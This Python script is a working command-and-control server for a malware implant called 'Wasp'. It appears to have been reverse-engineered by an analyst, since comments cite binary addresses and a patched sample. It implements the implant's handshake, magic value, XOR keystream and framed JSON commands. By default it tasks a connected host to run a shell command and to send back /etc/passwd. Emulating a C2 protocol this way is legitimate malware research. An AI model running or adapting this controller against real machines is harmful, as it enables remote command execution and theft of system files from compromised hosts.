#!/usr/bin/env python3

from __future__ import annotations

import json
import struct
from enum import Enum
import socketserver
import random

from pathlib import Path

from typing import Dict, List

import logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger("wasp")


# This is used in the "Handshake" method to authenticate between clients and servers
# TODO: We should patch the binary so it uses a different value
magic_secret = struct.pack("!I", 0x75636573)

# This comes from the "SimplePassword" class in libse1linux (0fe1248ecab199bee383cef69f2de77d33b269ad1664127b366a4e745b1199c8)
cipher_bytes = b'\xf7\xe0\xc9\xb2\x9b\x84\x6d\x56\x3f\x28\x11\xf9\xe2\xcb\xb4\x9d\x86\x6f\x58\x41\x2a\x13\xfb\xe4\xcd\xb6\x9f\x88\x71\x5a\x43\x2c\x15\xfd\xe6\xcf\xb8\xa1\x8a\x73\x5c\x45\x2e\x17\x00\xe8\xd1\xba\xa3\x8c\x75\x5e\x47\x30\x19\x02\xea\xd3\xbc\xa5\x8e\x77\x60\x49\x32\x1b\x04\xec\xd5\xbe\xa7\x90\x79\x62\x4b\x34\x1d\x06\xee\xd7\xc0\xa9\x92\x7b\x64\x4d\x36\x1f\x08\xf0\xd9\xc2\xab\x94\x7d\x66\x4f\x38\x21\x0a\xf2\xdb\xc4\xad\x96\x7f\x68\x51\x3a\x23\x0c\xf4\xdd\xc6\xaf\x98\x81\x6a\x53\x3c\x25\x0e\xf6\xdf\xc8\xb1\x9a\x83\x6c\x55\x3e\x27\x10\xf8\xe1\xca\xb3\x9c\x85\x6e\x57\x40\x29\x12\xfa\xe3\xcc\xb5\x9e\x87\x70\x59\x42\x2b\x14\xfc\xe5\xce\xb7\xa0\x89\x72\x5b\x44\x2d\x16\xfe\xe7\xd0\xb9\xa2\x8b\x74\x5d\x46\x2f\x18\x01\xe9\xd2\xbb\xa4\x8d\x76\x5f\x48\x31\x1a\x03\xeb\xd4\xbd\xa6\x8f\x78\x61\x4a\x33\x1c\x05\xed\xd6\xbf\xa8\x91\x7a\x63\x4c\x35\x1e\xef\xd8\xc1\xaa\x93\x7c\x65\x4e\x37\x20\x09\xf1\xda\xc3\xac\x95\x7e\x67\x50\x39\x22\x0b\xf3\xdc\xc5\xae\x97\x80\x69\x52\x3b\x24\x0d\xf5\xde\xc7\xb0\x99\x82\x6b\x54\x3d\x26\x0f\xf7'

class WaspMethod(Enum):
    SIMPLE_CIPHER = 1
    EMPTY_CIPHER = 0

class WaspCipher(object):
    method: WaspMethod = WaspMethod.EMPTY_CIPHER
    def cipher(self, data: bytes) -> bytes:
        return data

class WaspSimpleCipher(WaspCipher):
    method: WaspMethod = WaspMethod.SIMPLE_CIPHER
    offset: int = 0
    def __init__(self, offset: int = 0) -> None:
        self.offset = offset

    def cipher(self, data: bytes) -> bytes:
        encrypted_bytes = b''
        for b in data:
            encrypted_value = b ^ cipher_bytes[self.offset]
            encrypted_bytes += struct.pack('B', encrypted_value)
            self.offset += 1
            self.offset = self.offset % len(cipher_bytes)
        return encrypted_bytes

class WaspException(Exception):
    pass

class WaspCommand(object):
    # TODO: Associate response type
    # TODO: Provide callback for response maybe??
    def get_dict(self) -> Dict:
        raise NotImplementedError()

    def get_json(self) -> str:
        return json.dumps(self.get_dict())

    def pack(self) -> bytes:
        encoded = self.get_json().encode('utf-8')
        return struct.pack("!I", len(encoded)) + encoded

    def __repr__(self) -> str:
        return json.dumps(self.get_dict(), sort_keys=True, indent=2)

class WaspCommandHandshake(WaspCommand):
    def get_dict(self) -> Dict:
        return {
            "uri": 'handshake'
        }

class WaspCommandDownload(WaspCommand):
    path: Path
    def __init__(self, path: Path | str) -> None:
        if isinstance(path, str):
            path = Path(path)
        self.path = path

    def get_dict(self) -> Dict:
        return {
            'uri': 'download',
            'headers': {
                'File-Path': str(self.path),
            },
        }

class WaspCommandExecute(WaspCommand):
    command: str
    def __init__(self, command: str):
        self.command = command

    def get_dict(self) -> Dict:
        return {
            "uri": "command",
            "headers": {
                "Command-Line": self.command
            }
        }
        

class WaspServer(socketserver.BaseRequestHandler):
    logger: logging.Logger = logger.getChild("C2")

    cipher_to_wasp: WaspCipher = WaspCipher()
    cipher_from_wasp: WaspCipher = WaspCipher()

    def handle(self):
        self.logger.info(f"Connection received: {self.request}")
        self.handshake()

        # TODO: Set up a read thead?

        commands: List[WaspCommand] = []

        commands.append(WaspCommandExecute('/bin/touch /tmp/hello'))
        commands.append(WaspCommandDownload('/etc/passwd'))

        for command in commands:
            self.send_command(command)
            self.receive_result()

    def handshake_from_wasp(self) -> WaspMethod:
        # Get config from wasp

        # @ 0x00416837
        received_secret = self.request.recv(len(magic_secret))
        self.logger.info(f"Received: {received_secret}")
        if received_secret != magic_secret:
            # We're talking to a Wasp!
            raise WaspException(f"This is not a Wasp! {received_secret}")

        # Read reserved field, one byte, should equal 0x0
        # @ 0x00416878
        reserved_field = self.request.recv(1)
        self.logger.debug(f"Reserved field: {reserved_field}")
        if not reserved_field == b'\x00':
            raise WaspException(f"Unexpected reserved field: {reserved_field}")

        # Receive the crypt method. Hardcoded to 1, we've patched to 0
        # @ 0x004168b9
        method_raw = self.request.recv(1)
        method_value, = struct.unpack('!B', method_raw)
        method = WaspMethod(method_value)
        self.logger.info(f"Crypt method from Wasp: {method}")
        if method == WaspMethod.EMPTY_CIPHER:
            self.cipher_from_wasp = WaspCipher()
        if method == WaspMethod.SIMPLE_CIPHER:
            offset_raw = self.request.recv(1)
            offset, = struct.unpack('!B', offset_raw)
            self.logger.info(f"SimpleCipher offset: {offset}")
            self.cipher_from_wasp = WaspSimpleCipher(offset)

        # The Wasp will now immediately send a response
        # @ 0x00416d32
        return method

    def handshake_to_wasp(self):
        self.logger.info(f"Handshake to wasp")
        # First the magic
        self.logger.debug(f"Sending magic: {magic_secret}")
        self.request.sendall(magic_secret)
        # Then the reserved field
        self.logger.debug("Sending reserved field")
        self.request.sendall(b'\x01') # TODO: Should this be 0x0??
        self.cipher_to_wasp = WaspCipher()
        method = self.cipher_to_wasp.method
        self.logger.info(f"Sending method: {method}")
        self.request.sendall(struct.pack('!B', method.value))

    def handshake(self):
        """
        Establish comms with wasp. This involves receiving details about the comms from wasp
        then responding with out comms config.
        """
        method = self.handshake_from_wasp()
        self.receive_result() # Receive the system info
        self.handshake_to_wasp()
        self.send_command(WaspCommandHandshake())

    def send_command(self, command: WaspCommand):
        self.logger.info(f"Tasking with {command}")
        packed = command.pack()
        encrypted = self.cipher_to_wasp.cipher(packed)
        self.request.sendall(encrypted)
        self.logger.info(f"Tasked")

    def receive_result(self):
        # First receive the length
        encrypted_result_length = self.request.recv(4)
        if not encrypted_result_length:
            raise WaspException(f"Didn not receive response length: {encrypted_result_length}")
        raw_result_length = self.cipher_from_wasp.cipher(encrypted_result_length)
        if not raw_result_length:
            raise WaspException(f"Did not decrypt response length: {raw_result_length}")
        result_length, = struct.unpack("!I", raw_result_length)
        # then the response
        encrypted_response: bytes = self.request.recv(result_length)
        raw_response = self.cipher_from_wasp.cipher(encrypted_response)
        response = json.loads(raw_response.decode('utf-8'))

        response_pretty = json.dumps(response, indent=2, sort_keys=True)
        self.logger.info(f"Received response: {response_pretty}")


if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('--port', type=int, default=7777, help='The port to listen on')
    args = parser.parse_args()
    logger.info("Wasp ready to serve")
    with socketserver.ThreadingTCPServer(('0.0.0.0', args.port), WaspServer) as server:
        server.serve_forever()
    logger.warning(f"Shutting down!")
